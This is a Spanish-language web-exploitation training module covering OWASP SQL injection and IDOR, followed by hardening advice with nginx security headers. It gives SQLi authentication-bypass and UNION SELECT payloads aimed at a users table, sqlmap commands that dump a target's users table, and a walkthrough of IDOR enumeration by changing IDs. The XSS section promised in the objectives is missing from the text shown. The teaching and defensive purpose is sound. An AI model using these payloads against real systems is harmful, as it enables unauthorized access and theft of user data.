04 — Explotación Web

OWASP Top 10: SQLi, XSS, IDOR. Explotación y remediación.

Objetivos de Aprendizaje

Identificar y explotar SQL Injection.
Detectar y ejecutar Cross-Site Scripting (XSS).
Explotar IDOR / Broken Access Control.
Aplicar mitigaciones y hardening web.

Contenido del Módulo

01

SQL Injection (SQLi)

OWASP A03:2021

Manipular consultas SQL para extraer o modificar datos.

1
Identificar: Parámetros de entrada a bases de datos
2
Probar: ' OR '1'='1, UNION SELECT, etc.
3
Explotar: Extraer datos, bypass autenticación
4
Automatizar: sqlmap para confirmación
SQLi
# Bypass de autenticación
' OR '1'='1
' OR '1'='1'--

# UNION-based injection
' UNION SELECT username,password FROM users--

# sqlmap automatizado
sqlmap -u "http://target.com/?id=1" --dbs
sqlmap -u "http://target.com/?id=1" -T users --dump
sqlmap Burp Suite

IDOR / Broken Access Control

OWASP A01:2021

Acceder a recursos ajenos cambiando IDs o parámetros.

1
Identificar: URLs con IDs numéricos o predecibles
2
Probar: Cambiar ID por otro valor
3
Explotar: Acceder a datos de otros usuarios
IDOR
# Original
https://app.com/api/user/12345

# Probar con otro ID
https://app.com/api/user/12346
https://app.com/api/user/12347

# Si devuleve datos → IDOR confirmado
04

Defensa y Hardening

Blue Team

Mitigar vulnerabilidades web identificadas.

1
SQLi: Queries parametrizadas, WAF
2
XSS: Sanitización, CSP headers, encoding
3
IDOR: Control de acceso por recurso, UUIDs
4
Headers: X-Frame-Options, X-Content-Type-Options
Nginx
# Headers de seguridad
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header X-XSS-Protection "1; mode=block";
add_header Content-Security-Policy "default-src 'self'";
